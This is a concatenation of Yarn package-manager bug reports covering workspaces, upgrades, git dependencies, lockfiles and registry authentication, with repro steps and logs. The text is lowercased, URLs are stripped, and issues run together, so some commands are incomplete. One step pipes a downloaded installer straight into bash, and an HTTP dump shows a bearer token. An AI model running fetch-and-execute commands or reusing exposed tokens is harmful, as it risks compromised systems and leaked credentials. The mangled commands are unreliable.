<--- last few gcs ---> [19200:00000297663fa890] 355672 ms: mark-sweep 1400.8 (1441.3) -> 1400.8 (1440.3) mb, 650.3 / 0.0 ms (+ 0.0 ms in 0 steps since start of marking, biggest step 0.0 ms, walltime since start of marking 650 ms) last resort
[19200:00000297663fa890] 356269 ms: mark-sweep 1400.8 (1440.3) -> 1400.8 (1440.3) mb, 596.1 / 0.0 ms last resort <--- js stacktrace ---> ==== js stack trace ========================================= security context: 00000086e1c1ba89 <js object> 1: hasownproperty(this=0000028b75bd4ae1 <an object with map 000002269fe9e769>,0000023a5ff82fc1 <string[256]: c:\\path\\to\\project\ ode_modules\\\\@company\\dep-a\ ode_modules\\\\@company\\dep-b\ ode_modules\\\\@company\\dep-c\ ode_modules\\\\@company\\dep-d\\path\\to\\file.js>) 2: _readdir [c:\\path..
fatal error: call_and_retry_last allocation failed - javascript heap out of memory
</details> note that the path `<rootdir>/packages/node_modules/dep-a/node_modules/dep-b/node_modules/dep-c` is not being resolved back to `<rootdir>/packages/node_modules/dep-c`
**if the current behavior is a bug, please provide the steps to reproduce.** unfortunately this was on closed source code, but the steps involve having a large (41 package) typescript monorepo and running the typescript compiler on it.
in a project work workspaces, `yarn outdated` claims everything is up to date
(the root project has no dependences)
`yarn workspace api outdated` errors with the following: ```
yarn workspace v1.0.0
yarn outdated v1.0.0
error no lockfile in this directory
run `yarn install` to generate one.
error command failed.
exit code: 1
command: /usr/local/cellar/node/8.4.0/bin/node
arguments: /usr/local/cellar/yarn/1.0.0_1/libexec/lib/cli.js outdated
directory: /volumes/git/project/packages/api
output: info visit for documentation about this command.
``` **if the current behavior is a bug, please provide the steps to reproduce.**
cannot remove a package that was installed w/o manifest (cf
#3624) **if the current behavior is a bug, please provide the steps to reproduce.**
install a package w/o manifest, e.g.
``yarn add `` then try to remove it:
``yarn remove scroller`` and the system complains: ```
error couldn\'t find a package.json file in "...\\\ ode_modules\\\\scroller"
reproduction repository: the structure ```
// root package.json has dep on:
babel-core@7.0.0-alpha.18
babel-cli@7.0.0-alpha.18
// packages:
packages/babel-core@7.0.0-alpha.19
packages/babel-cli@7.0.0-alpha.19 depending on babel-core@7.0.0-alpha.19
node_modules/ babel-core@7.0.0-alpha.18 babel-cli@7.0.0-alpha.18
``` there seems to be some installation issues when the root package depends on older versions of packages from npm, and they also exist in the yarn workspace packages themselves, they don't have their dependencies symlinked to the related packages
**if the current behavior is a bug, please provide the steps to reproduce.**
i tried to deploy some repository on a new machine that didn't have git installed (debian)
$ yarn install --frozen-lockfile
yarn install v0.27.5
[1/5] resolving packages...
error refusing to download the git repo {"hostname":"github.com","protocol":"https:","repository":" "} over https without a commit hash - possible certificate error?
info visit for documentation about this command.
``` it is of course completely reasonably that the installation fails, but the given error message is misleading and unrelated to the real problem
the problem wasn't a missing commit hash or bad certificate, but the missing `git` binary.
yarn pack is completely broken for usage with bundleddependencies because
1) const bundleddependencies = pkg.bundleddependencies,
> the above seems to be a typo because yarn always normalizes the schema to "bundledependencies" no matter if it\'s called bundleddependencies or bundledependencies in package.json
so, unless i change it to pkg.bundledependencies, it's always empty
2) there's a logic that creates pattern to exclude node_modules/$bundled_dependency but the logic later on in tar.pack `ignore` handler is also broken and these filters are not accounted for, thus not packaging /any/ bundled dependencies (not sure how to fix it)
3) tar.pack function does not follow symlinks which it should to properly pack the bundled dependencies (i.e
usage with npm link)
4) all bundled dependencies should be purged from package.json `dependencies` when packaging or otherwise npm install will try to resolve them and break **if the current behavior is a bug, please provide the steps to reproduce.** 1
create a package nr 1
create a package nr 2
npm link package nr2 in package nr1 and add entry to package.json like
dependencies: {"package2":"../package2"}
try to use yarn pack
look at the resulting tar file
run `upgrade-interactive` on a project which has no updates needed and it works except it doesn't show packages at all and keeps erroring until you `ctrl+c` or whatever to force kill it
**if the current behavior is a bug, please provide the steps to reproduce.** - try `yarn global upgrade-interactive` and check if you have any updates
if you do, install them
else, you will see the behaviour i expected.
- if you installed updates, then try `yarn global upgrade-interactive`
you can also remove the `global` and try this on a test project.
`yarn install` fails with this error:
cloning into 'c:\\users\\kevin\\appdata\\local\\yarn\\cache\\v1\\.tmp\\d467663531f204616cf61ecefbe7254c'...
fatal: invalid path '/home/kevin/code/thenextfacebook/c:\\users\\kevin\\appdata\\local\\yarn\\cache\\v1\\.tmp\\d467663531f204616cf61ecefbe7254c': no such file or directory
which appears to be a relative path issue
**please mention your node.js, yarn and operating system version.** windows 10
--> cygwin_nt-10.0
$ yarn --version
$ which yarn
--> /usr/local/bin/yarn
$ node -v --> v6.11.2
$ which node
--> node: aliased to /cygdrive/c/"program files"/nodejs/node
normally i expect `yarn upgrade-interactive` command to update dependencies, and if they all up-to-date it should say "all packages up-to-date" like message
in `0.27.5`, it works as i expect: ```
yarn upgrade-interactive v0.27.5
success all of your dependencies are up to date.
done in 2.79s.
``` but the `v1.0.0-20170807.1537` nightly build produces this: ```
yarn upgrade-interactive v1.0.0-20170807.1537
info color legend : "<red>" : patch update backward-compatible bug fixes "<yellow>" : minor update backward-compatible features
? choose which packages to update
(press <space> to select, <a> to toggle all, <i> to inverse selection)
? choose which packages to update.
(i press enter here)
>> you must choose at least one package.
``` there are not any to-update dependencies and it shows me an empty list to select which i cannot do anything with it and just press enter, it warns me to select a package to update
the only way to exit this prompt is to kill by <kbd>ctrl</kbd> + <kbd>c</kbd> **if the current behavior is a bug, please provide the steps to reproduce.** ```
curl -o- -l | bash -s -- --nightly
cd /path/to/a/node/project/with/all/packages/are/up/to/date
yarn upgrade-interactive
my project's local `.yarnrc` is configured with this setting: ```
# this is an autogenerated file
do not edit this file directly.
# yarn lockfile v1 yarn-offline-mirror "./virtual_env/yarn_packages"
``` in my `package.json` i have a reference to the following internal package: ```
"private_package": "git+ssh://git@git.corp.net:private_package.git",
``` notice that git repository is at the root of the server, rather than being a subfolder as with github repositories: `git@github.com:itsananderson/some-repo.git` unfortunately, with the way yarn parses the git url to generate the cache name, it generates this: ```
:private_repo.git-198dac0ae3f10765058a69d02c4f987527cd9b51
i believe that's due to this code: #l40 when a url like `git+ssh://git@git.corp.net:private_package.git` is parsed, the `pathname` property is set to `:private_package.git`
one potential fix for this would be to simply trim the colon from the beginning
**if the current behavior is a bug, please provide the steps to reproduce.** i tried to create a github demo of this issue, but since the issue only appears for repositories where the git repo name is at the root of the server, the issue can't be reproduced with github repositories
here are the steps i used to create a minimal repro by creating a local `--bare` git clone and adding it as `git+ssh//$user@localhost:node-extend.git`
i used `node-extend` because it's a simple module with no dependencies that can be installed from its git repository
# create local bare git repo
git clone --bare git@github.com:justmoon/node-extend.git # clone local repo to make sure host signature is accepted etc.
git clone $user@localhost:node-extend.git # create test project
mkdir git-cache-repro
cd git-cache-repro
yarn init -y
echo \'yarn-offline-mirror "./yarn-packages"\' >> .yarnrc
yarn add git+ssh://$user@localhost:node-extend.git
ls yarn-packages
# note that the listed package is prefixed by a colon
``` note that you may need to authorize your own ssh key to log into your machine
this should work for a typical setup: ```
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
``` hopefully that's enough detail to make the repro easy, but let me know if you need more.
running `yarn why` fails with the error below: ```
error couldn\'t find package "workspace-aggregator-2e092624-1b04-4de1-9847-260953ff91b5" on the "npm" registry.
the v4 uuid is random and will change each time
**if the current behavior is a bug, please provide the steps to reproduce.** the shell steps below will create a contrived simple repo that reproduces the problem
rm -rf repo
mkdir -p packages/p1
echo \'{"name":"repo", "private":true, "workspaces":["packages/*"]}\' >package.json
echo \'{"name":"p1", "version": "0.0.1"}\' >packages/p1/package.json
yarn install
yarn why p1
running `yarn workspace my-package upgrade classnames` changes the `package.json` at the top-level instead of the one at `./packages/my-package/package.json` **please mention your node.js, yarn and operating system version.**
yarn v0.27.5
node v7.1.0
$ yarn add whatever
yarn add v0.27.5
[1/4] resolving packages...
error an unexpected error occurred: " not found".
info if you think this is a bug, please open a bug report with the information provided in "/private/tmp/yarn-issue/packages/a/yarn-error.log".
info visit for documentation about this command.
``` **if the current behavior is a bug, please provide the steps to reproduce.** ```
git clone /tmp/yarn-issue
cd /tmp/yarn-issue/packages/a
yarn add whatever
i have a dependency tree like this ```
|-- shared-dep@^1.0.0
| |-- shared-dep@^1.1.0
|-- dep-2 |-- shared-dep@^1.1.0
``` and when i `yarn upgrade shared-dep` (say when 1.2.0 is released) it causes duplication in yarn.lock where the resolution for `shared-dep` doesn't change for the version pulled in by dep-1 and dep-2 and it adds a new (duplicate) resolution for shared-dep so that now it's pulling in 1.1.0 and 1.2.0
before upgrade: ```
"shared-dep@^1.1.0", "shared-dep@1.0.0": version: "1.1.0" resolved "..."
``` after upgrade: ```
"shared-dep@^1.1.0", "shared-dep@1.0.0": version: "1.1.0" resolved "..." "shared-dep@^1.2.0": version: "1.2.0" resolved "..."
``` **if the current behavior is a bug, please provide the steps to reproduce.** 1
clone 2
run `yarn upgrade commander@^2.4.0` 3
observe that the new `yarn.lock` file has two overlapping entries for commander: ``` commander@^2.3.0: version "2.3.0" resolved " #fd430e889832ec353b9acd1de217c11cb3eef873" commander@^2.4.0: version "2.11.0" resolved " #157152fd1e7a6c8d98a5b715cf376df928004563" ```
`yarn add json2csv` or `yarn add json2csv@3.9.0 -e` yarn installed package.json in node_modules
{ "name": "json2csv", "preferglobal": "true", "version": "3.9.1", "description": "convert json to csv", "keywords": [ "json", "to", "csv", "export", "convert", "parse" ], "author": { "name": "mirco zeiss", "email": "mirco.zeiss@gmail.com", "twitter": "zemirco" }, "license": "mit", "bin": { "json2csv": "./bin/json2csv.js" }, "main": "./lib/json2csv.js", "repository": { "type": "git", "url": " " }, "scripts": { "build": "webpack", "test": "node test | tap-spec", "test-coverage": "istanbul cover test/index.js --report lcovonly | tap-spec", "deploy:docs": "docpress b && git-update-ghpages zemirco/json2csv _docpress", "prepublish": "in-publish && npm run before:publish || not-in-publish", "before:publish": "npm test && npm run build && npm run deploy:docs && npm run release", "release": "standard-version" }, "dependencies": { "cli-table": "^0.3.1", "commander": "^2.8.1", "debug": "^2.2.0", "flat": "^2.0.0", "lodash.flatten": "^4.4.0", "lodash.get": "^4.4.0", "lodash.set": "^4.3.0", "lodash.uniq": "^4.5.0", "lodash.clonedeep": "^4.5.0", "path-is-absolute": "^1.0.0" }, "devdependencies": { "async": "^2.0.1", "docpress": "^0.7.0", "eslint": "^3.3.1", "git-update-ghpages": "^1.3.0", "in-publish": "^2.0.0", "istanbul": "^0.4.3", "standard-version": "^4.0.0", "tap-spec": "^4.1.0", "tape": "^4.0.0", "webpack": "^1.13.1" }
``` yarn.lock
json2csv@3.9.0: version "3.9.1" resolved " #4cd460f31b47817e1732268e21082fc37b1483da" dependencies: cli-table "^0.3.1" commander "^2.8.1" debug "^2.2.0" flat "^2.0.0" lodash.clonedeep "^4.5.0" lodash.flatten "^4.4.0" lodash.get "^4.4.0" lodash.set "^4.3.0" lodash.uniq "^4.5.0" path-is-absolute "^1.0.0"
the output of `yarn config` is empty if run from within a yarn script
**if the current behavior is a bug, please provide the steps to reproduce.** 1
create an empty project with a script in `package.json`: ```
"scripts": { "debug": "yarn config list"
run the script with `yarn run debug`.
when run as the `root` user on linux, yarn does not use `$home/.npmrc` but uses `/usr/local/share/.npmrc` instead
**if the current behavior is a bug, please provide the steps to reproduce.** #l8
#l132 run `yarn config list --verbose` as root on linux (while not in any subdirectory of`$home`) and observe that yarn looks for `.npmrc` first in the current directory, then in `/usr/local/share/`, but never in `$home` (`/root`).
when you do a yarn install in a workspaces enabled project, yarn doesn't run the various lifecycle scripts for workspace packages, e.g
`prepare` `prepublish` `preinstall` etc **if the current behavior is a bug, please provide the steps to reproduce.** here is a commit adding a failing test case:
- on the first run on the ci, when's there's no node_modules dir, yarn will go and link the needed bins to the sub packages, install unhoisted deps, etc - on a repetitive run of the ci, `yarn install` will look at the cached `node_modules` and will think he is all good and won't perform the bin linking and unhoisted install
at workspace root: ```
$ yarn list
yarn list v0.27.5
error couldn\'t find package "workspace-aggregator-c2abca29-be61-4e70-9663-a8e984758828" on the "npm" registry.
info visit for documentation about this command.
``` in one of the workspace package: ```
$ yarn list
yarn list v0.27.5
error no lockfile in this directory
run `yarn install` to generate one.
**if the current behavior is a bug, please provide the steps to reproduce.**
``` **reproduction steps** ```
$ mkdir /tmp/yarn-workspace-list
$ cd /tmp/yarn-workspace-list
$ echo 'workspaces-experimental true' >> .yarnrc
$ mkdir -p packages/package1 packages/package2
$ yarn init -y; cd packages/package1; yarn init -y; cd ../package2; yarn init -s; cd ../..
$ vi package.json # edit for workspace with `"workspaces": ["packages/**/*"]`
$ cd packages/package1; yarn add uuid
$ yarn list
$ cd ../..; yarn list
`yarn add `
yarn add v0.27.5
info no lockfile found.
[1/4] resolving packages...
error an unexpected error occurred: " request failed \\"406 not acceptable\\"".
info if you think this is a bug, please open a bug report with the information provided in "c:\\\\users\\\\user\\\\source\\\\yarn-test\\\\yarn-error.log".
info visit for documentation about this command.
``` **if the current behavior is a bug, please provide the steps to reproduce.**
`yarn add `
after upgrading from 0.24.6 to 0.27.5 via homebrew, i can no longer use the `yarn outdated` command due to this error: ```
command failed: yarn outdated error: enoent: no such file or directory, open 'child_process.js' at object.fs.opensync (fs.js:651:18) at object.fs.readfilesync (fs.js:553:33) at callsiterecord.rendersync (/users/evgueni.naverniouk/git/web-platform/node_modules/callsite-record/lib/index.js:214:26) at checkversions.run.catch (/users/evgueni.naverniouk/git/web-platform/node_modules/check-npm-versions/bin/cli.js:41:41) at trycatcher (/users/evgueni.naverniouk/git/web-platform/node_modules/bluebird/js/release/util.js:16:23) at promise._settlepromisefromhandler (/users/evgueni.naverniouk/git/web-platform/node_modules/bluebird/js/release/promise.js:512:31) at promise._settlepromise (/users/evgueni.naverniouk/git/web-platform/node_modules/bluebird/js/release/promise.js:569:18) at promise._settlepromise0 (/users/evgueni.naverniouk/git/web-platform/node_modules/bluebird/js/release/promise.js:614:10) at promise._settlepromises (/users/evgueni.naverniouk/git/web-platform/node_modules/bluebird/js/release/promise.js:689:18) at async._drainqueue (/users/evgueni.naverniouk/git/web-platform/node_modules/bluebird/js/release/async.js:133:16) at async._drainqueues (/users/evgueni.naverniouk/git/web-platform/node_modules/bluebird/js/release/async.js:143:10) at immediate.async.drainqueues (/users/evgueni.naverniouk/git/web-platform/node_modules/bluebird/js/release/async.js:17:14) at runcallback (timers.js:800:20) at tryonimmediate (timers.js:762:5) at processimmediate [as _immediatecallback] (timers.js:733:5)
``` downgrading back down to 0.24.6 makes the error go away
**if the current behavior is a bug, please provide the steps to reproduce.** ```
brew upgrade && brew upgrade
yarn outdated
yarn saves the entered version number to package.json, even if it did not exist and another version was selected from a list
this will make yarn prompt the user with the version list each time `yarn` is ran
i run `yarn add typescript@99`
version 99 does not exist, so yarn will prompt me with a list of versions to choose from.
when i select 2.4.1 and hit enter, version 2.4.1 will be installed.
yarn then outputs this message:
success saved 1 new dependency.
typescript@2.4.1
but yarn actually saved `"typescript": "99"` to package.json.
when using `yarn upgrade --latest`, in some cases there's an error (even though `yarn` and `yarn upgrade` work fine)
**if the current behavior is a bug, please provide the steps to reproduce.**
create an empty directory with the following `package.json` (this is the minimal example that shows the error):
{ "name": "test", "dependencies": { "karma-coverage": "^1.1.1", "karma-coverage-istanbul-reporter": "^0.2.0", "karma-jasmine": "~1.1.0", "karma-junit-reporter": "^1.2.0", "karma-phantomjs-launcher": "^1.0.2", "karma-sourcemap-loader": "~0.3.7", "karma-webpack": "^1.8.1", "phantomjs-prebuilt": "^2.1.14" }, "devdependencies": { "grunt": "~1.0.1" }
(this works correctly.)
run `yarn upgrade --latest`.
i get an error like this (clearing yarn cache doesn't help):
$ yarn upgrade --latest
yarn upgrade v0.27.5
warning package.json: no license field
warning package.json: no license field
warning test: no license field
[1/4] resolving packages...
[2/4] fetching packages...
warning pattern ["phantomjs-prebuilt@^2.1.14"] is trying to unpack in the same destination "c:\\\\users\\\\u001912\\\\appdata\\\\local\\\\yarn\\\\cache\\\\v1\\\ pm-phantomjs-prebuilt-2.1.14-d53d311fcfb7d1d08ddb24014558f1188c516da0" as pattern ["phantomjs-prebuilt@^2.1.7"]
this could result in a non deterministic behavior, skipping.
[3/4] linking dependencies...
warning "webpack-dev-middleware@1.11.0" has unmet peer dependency "webpack@^1.0.0 || ^2.0.0 || ^3.0.0".
warning "karma-jasmine@1.1.0" has unmet peer dependency "jasmine-core@*".
warning "karma-jasmine@1.1.0" has unmet peer dependency "karma@*".
warning "karma-junit-reporter@1.2.0" has unmet peer dependency "karma@>=0.9".
warning "karma-phantomjs-launcher@1.0.4" has unmet peer dependency "karma@>=0.9".
warning "karma-webpack@2.0.3" has unmet peer dependency "webpack@^1.1.0 || ^2 || ^2.1.0-beta.0 || ^2.2.0-rc.0".
[4/4] rebuilding all packages...
error c:\\users\\u001912\\appdata\\local\\yarn\\cache\\v1\ pm-phantomjs-prebuilt-2.1.14-d53d311fcfb7d1d08ddb24014558f1188c516da0: command failed.
exit code: 1
command: c:\\windows\\system32\\cmd.exe
arguments: /d /s /c node install.js
directory: c:\\users\\u001912\\appdata\\local\\yarn\\cache\\v1\ pm-phantomjs-prebuilt-2.1.14-d53d311fcfb7d1d08ddb24014558f1188c516da0
module.js:442 throw err; ^ error: cannot find module 'request-progress' at function.module._resolvefilename (module.js:440:15) at function.module._load (module.js:388:25) at module.require (module.js:468:17) at require (internal/module.js:20:19) at object.<anonymous> (c:\\users\\u001912\\appdata\\local\\yarn\\cache\\v1\ pm-phantomjs-prebuilt-2.1.14-d53d311fcfb7d1d08ddb24014558f1188c516da0\\install.js:9:23) at module._compile (module.js:541:32) at object.module._extensions..js (module.js:550:10) at module.load (module.js:458:32) at trymoduleload (module.js:417:12) at function.module._load (module.js:409:3)
info visit for documentation about this command.
packages are not rebuilt if all non-build artifacts already exist at the destination
this results in errors like: ```
module.js:327 throw err; ^ error: cannot find module '../build/release/hash' at function.module._resolvefilename (module.js:325:15) at function.module._load (module.js:276:25) at module.require (module.js:353:17) at require (internal/module.js:12:17) at object.<anonymous> (/.../node_modules/xxhash/lib/xxhash.js:4:13) at module._compile (module.js:409:26) at object.module._extensions..js (module.js:416:10) at module.load (module.js:343:32) at function.module._load (module.js:300:12) at module.require (module.js:353:17)
``` **if the current behavior is a bug, please provide the steps to reproduce.** ```
$ yarn add xxhash
$ rm node_modules/xxhash/build/release/hash.node
// bring in an updated yarn.lock (i.e., via git)
$ yarn // xxhash does not get rebuilt
{ "dependencies": { "npm": "^3.10.5" }
yarn install v0.27.0
warning package.json: no license field
info no lockfile found.
warning no license field
[1/4] resolving packages...
warning npm > request > node-uuid@1.4.8: use uuid module instead
[2/4] fetching packages...
[3/4] linking dependencies...
error an unexpected error occurred: "the same file /users/bestander/work/temp/3202/node_modules/npm/node_modules can\'t be copied twice in one bulk copy".
info if you think this is a bug, please open a bug report with the information provided in "/users/bestander/work/temp/3202/yarn-error.log".
info visit for documentation about this command.
``` check introduced in #3712 another example
yarn add nyc@11.0.3
git fails to connect to repos behind a proxy since certain environment variables are not passed to it when making the call
internal reference: t19705486
**if the current behavior is a bug, please provide the steps to reproduce.** block git access without a proxy and then try to use the proxy
normal `git xxx` commands from the shell passes but commands issued by `yarn` fails.
adding an the `uws` package to a package.json dependencies section causes yarn to report that it created the lock file successfully, but the lock file does not exist
**if the current behavior is a bug, please provide the steps to reproduce.** create an empty folder with the following `package.json` file: ```
{ "name": "yarn-lock-bug", "version": "1.0.0", "description": "repro bug with yarn not creating lock file", "author": "jharris4", "license": "mit", "dependencies": { "engine.io-parser": "~2.1.0" }, "optionaldependencies": { "uws": "~0.14.4" }
``` then run `yarn install`
it will report `success saved lockfile.` but the yarn.lock file does not exist
removing the dependency and running the same steps (with `rm -rf node_modules` and `rm yarn.lock` first if necessary to start from a clean state) does not produce the bug: ```
{ "name": "yarn-lock-bug", "version": "1.0.0", "description": "repro bug with yarn not creating lock file", "author": "jharris4", "license": "mit", "dependencies": { "engine.io-parser": "~2.1.0" }
} ``` note that running `yarn install` a second time does correctly create the lock file
this bug might have something to do with the fact that the `uws` package uses an install script with `node-gyp`:
the current behaviour (version 0.24.*) will install them in vendor/node_modules/.bin
after upgrading to version 0.25.4 it installs them incorrectly in node_modules/.bin, the packages are still installed in vendor/node_modules and the symlinks in node_modules/.bin still work.
however it seems some of them are missing, as i can't find uglifyjs binary for example in my project in that folder.
in package.json:
`"mybackendmodule": "file:../mybackendmodule.git"`
c:\\git\\myfrontendmodule.git>yarn
yarn install v0.24.5
[1/4] resolving packages...
error command failed.
exit code: 128
command: git
arguments: clone file:../mybackendmodule.git c:\\users\\christoph\\appdata\\local\\yarn\\cache\\v1\\.tmp\\534d3fc1a8a74d07d486ff305cbd21f0
directory: c:\\git\\myfrontendmodule.git
cloning into 'c:\\users\\christoph\\appdata\\local\\yarn\\cache\\v1\\.tmp\\534d3fc1a8a74d07d486ff305cbd21f0'...
ssh: could not resolve hostname file: name or service not known
fatal: could not read from remote repository
please make sure you have the correct access rights
and the repository exists.
``` renaming the folder to mybackendmodule.got, it works
but on next checkout, it fails again, because the repos are named *.git.
**if the current behavior is a bug, please provide the steps to reproduce.**
link a local package which name has git as extension.
in our enterprise, the git extension is default to show that the package comes from our git repository.
after running `yarn` in a directory with this `package.json`, and a clean cache, `yarn check` reports errors
`package.json`: ```json
{ "name": "test-app", "version": "0.0.1", "engines": { "node": "6.9.1" }, "devdependencies": { "erik": "^1.2.1", "handlebars": "4.0.6", "jasmine": "2.3.1", "main-bower-files": "2.9.0", "merge-stream": "0.1.8", "minimatch": "3.0.3", "resolve-vars": "1.0.0", "rewire": "2.5.1", "rollup-plugin-babel": "2.6.1", "rollup-plugin-bower-resolve": "0.2.0", "rollup-plugin-commonjs": "5.0.5", "rollup-plugin-handlebars-plus": "0.2.0", "rollup-plugin-multi-entry": "2.0.0", "rollup-plugin-node-resolve": "2.0.0", "rollup-plugin-root-import": "0.2.0", "run-sequence": "1.1.4" }
``` output from `yarn check` ```
yarn check v0.24.6
warning test-app@0.0.1: no license field
error "erik#jasmine-core" is wrong version: expected "2.6.4", got "2.3.4"
error "jasmine#jasmine-core" not installed
warning "chokidar#fsevents#node-pre-gyp@^0.6.36" could be deduped from "0.6.36" to "node-pre-gyp@0.6.36"
error "jasmine#minimatch#lru-cache" is wrong version: expected "2.2.4", got "2.7.3"
error found 3 errors.
info visit for documentation about this command.
``` output from `yarn check` on a separate run of the repro steps ```
yarn check v0.24.6
warning test-app@0.0.1: no license field
warning "chokidar#fsevents#node-pre-gyp@^0.6.36" could be deduped from "0.6.36" to "node-pre-gyp@0.6.36"
error "jasmine#minimatch#lru-cache" is wrong version: expected "2.2.4", got "2.7.3"
error found 1 errors.
info visit for documentation about this command.
``` **if the current behavior is a bug, please provide the steps to reproduce.** place the above `package.json` in a clean directory, run `yarn && yarn check`
note that we can reproduce this on a much larger `package.json` with many more `error`s, and this is just one of many smaller `package.json` files that reproduces this issue.
if the dependencies of a `package.json` pull in multiple copies of the same version of a package, then the lifecycle scripts only seem to get run in one of the copies
**if the current behavior is a bug, please provide the steps to reproduce.** ```shell
cody.mello@ashur ~/src % git clone
cloning into 'sdc-vmapi'...
remote: counting objects: 6909, done.
remote: compressing objects: 100% (24/24), done.
remote: total 6909 (delta 17), reused 29 (delta 16), pack-reused 6868
receiving objects: 100% (6909/6909), 1.70 mib | 2.69 mib/s, done.
resolving deltas: 100% (5007/5007), done.
cody.mello@ashur ~/src % cd sdc-vmapi cody.mello@ashur ~/src/sdc-vmapi : master % sed -i -e '/moray/d' package.json
cody.mello@ashur ~/src/sdc-vmapi : master % node --version
cody.mello@ashur ~/src/sdc-vmapi : master % node ~/downloads/yarn-0.26.1.js install
yarn install v0.26.1
info no lockfile found.
[1/4] resolving packages...
warning restify > node-uuid@1.4.8: use uuid module instead
warning changefeed > restify-clients > node-uuid@1.4.8: use uuid module instead
warning sdc-clients > restify-clients > node-uuid@1.4.8: use uuid module instead
warning nodeunit > tap > glob > minimatch@2.0.10: please update to minimatch 3.0.2 or higher to avoid a regexp dos issue
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success saved lockfile.
done in 14.22s.
cody.mello@ashur ~/src/sdc-vmapi : master % find node_modules/ -name dtrace-provider -exec json -f {}/package.json version \\; -exec ls -ld {}/build/release/ \\; 0.8.3
ls: node_modules//changefeed/node_modules/restify-clients/node_modules/bunyan/node_modules/dtrace-provider/build/release/: no such file or directory
ls: node_modules//cueball/node_modules/dtrace-provider/build/release/: no such file or directory
drwxr-xr-x 5 cody.mello staff 170 jun 13 16:00 node_modules//dtrace-provider/build/release/
ls: node_modules//mname/node_modules/dtrace-provider/build/release/: no such file or directory
ls: node_modules//mooremachine/node_modules/dtrace-provider/build/release/: no such file or directory
ls: node_modules//moray/node_modules/dtrace-provider/build/release/: no such file or directory
ls: node_modules//restify/node_modules/bunyan/node_modules/dtrace-provider/build/release/: no such file or directory
ls: node_modules//restify-clients/node_modules/bunyan/node_modules/dtrace-provider/build/release/: no such file or directory
drwxr-xr-x 5 cody.mello staff 170 jun 13 16:00 node_modules//restify-clients/node_modules/dtrace-provider/build/release/
ls: node_modules//sdc-clients/node_modules/dtrace-provider/build/release/: no such file or directory
ls: node_modules//sigyan/node_modules/dtrace-provider/build/release/: no such file or directory
drwxr-xr-x 5 cody.mello staff 170 jun 13 16:00 node_modules//wf-client/node_modules/dtrace-provider/build/release/
``` only 3 of the 12 packages were built: `dtrace-provider@0.6.0`, `dtrace-provider@0.7.1`, and only one of the `dtrace-provider@0.8.3` packages
based on my reading of the code, the problem seems to be that [gettopologicalmanifest()]( #l150-l172) only returns a single entry in the `set` per unique package/version pair
this seems to be where the list of directories to run the lifecycle scripts [comes from]( #l246), so the `worker` only ever touches three directories.
running `yarn version` works ok until it executes `git add <thefullpathtomyrepo>`, then i get a "fatal: <thefullpathtomyrepo>/package.json is outside repository" line: #l150 **if the current behavior is a bug, please provide the steps to reproduce.**
checkout a repo, go into it, run `yarn version`
the current behavior is that yarn-offline-mirror-pruning (apparently) removes every single file in the folder that is not a current tarball
**if the current behavior is a bug, please provide the steps to reproduce.**
see [pruning an offline mirror | yarn]( but create e.g
a `.git` file in the folder first before pruning.
when using the verdaccio private npm registry, yarn fail to install a package
it fires a first request to get the packages version & meta, which is authenticated and works.
then it issues a second request to download the tgz file, which fails, as the request is not authenticated
on the other hand, npm does the same first request and successfully install the package by authenticating the second request
you can see included http request dump for more detail
**if the current behavior is a bug, please provide the steps to reproduce.**
install verdaccio with a test user, on localhost:4873 ## init
npm config set @testscope:registry
npm login --registry= --scope=@testscope yarn config set @testscope:registry
yarn login --registry= --scope=@testscope
``` ## publish a test project
mkdir hello12
yarn publish # ok
``` ## create an other test project
mkdir hello42
``` ## try to install the hello12 dep, with yarn ### command
yarn add @testscope/hello12
``` ### list package info
get /@testscope%2fhello12 http/1.1
user-agent: yarn/0.24.5 npm/? node/v7.10.0 linux x64
accept: application/vnd.npm.install-v1+json; q=1.0, application/json; q=0.8, */*
authorization: bearer vihb9ajr0pf7rs684a0dcnbndbg43wyfls0kichewmi=
host: localhost:4873
accept-encoding: gzip, deflate
connection: keep-alive
http/1.1 200 ok\ \
x-powered-by: verdaccio/2.1.7\ \
content-type: application/json; charset=utf-8\ \
etag: "042a358900e48a580493d1b6d944fe7e"\ \
vary: accept-encoding\ \
content-encoding: gzip\ \
x-status-cat:
date: wed, 17 may 2017 08:03:35 gmt\ \
connection: keep-alive\ \
transfer-encoding: chunked\ \
{ "name": "@testscope/hello12", "versions": { "1.0.6": { "name": "@testscope/hello12", "version": "1.0.6", "main": "index.js", "license": "mit", "_id": "@testscope/hello12@1.0.6", "scripts": {}, "_shasum": "b4880b9d85a49b5b08cdb5e3cd67fd5eec0e6177", "_from": ".", "_npmversion": "4.2.0", "_nodeversion": "7.10.0", "_npmuser": {}, "dist": { "shasum": "b4880b9d85a49b5b08cdb5e3cd67fd5eec0e6177", "tarball": " " } }, "1.0.7": { "name": "@testscope/hello12", "version": "1.0.7", "main": "index.js", "license": "mit", "_id": "@testscope/hello12@1.0.7", "scripts": {}, "_shasum": "a08c02725c91058d94dfad091fcf98b2a920d8f3", "_from": ".", "_npmversion": "4.2.0", "_nodeversion": "7.10.0", "_npmuser": {}, "dist": { "shasum": "a08c02725c91058d94dfad091fcf98b2a920d8f3", "tarball": " " } } }, "dist-tags": { "latest": "1.0.7" }, "_rev": "9-6457ff279507dc08", "readme": "", "_attachments": {}
``` ### get data request
get /@testscope%2fhello12/-/hello12-1.0.7.tgz http/1.1\ \
user-agent: yarn/0.24.5 npm/? node/v7.10.0 linux x64\ \
accept: application/octet-stream\ \
accept-encoding: gzip\ \
host: 127.0.0.1:4873\ \
connection: keep-alive\ \
http/1.1 403 forbidden\ \
x-powered-by: verdaccio/2.1.7\ \
content-type: application/json; charset=utf-8\ \
content-length: 83\ \
etag: w/"53-xkyc48nrj8niaupffqn0l9mvpja"\ \
vary: accept-encoding\ \
x-status-cat:
date: wed, 17 may 2017 08:03:35 gmt\ \
connection: keep-alive\ \
{"error": "unregistered users are not allowed to access package @testscope/hello12"}
``` ## install the hello12 dep, with npm ### command
npm install --save @testscope/hello12
``` ### list package info
get /@testscope%2fhello12 http/1.1\ \
accept-encoding: gzip\ \
authorization: bearer vihb9ajr0pf7rs684a0dcnbndbg43wyfls0kichewmi=\ \
version: 4.2.0\ \
accept: application/json\ \
referer: install [redacted]\ \
npm-session: 611fc4ee2e2cd241\ \
npm-in-ci: false\ \
user-agent: npm/4.2.0 node/v7.10.0 linux x64\ \
host: localhost:4873\ \
connection: keep-alive\ \
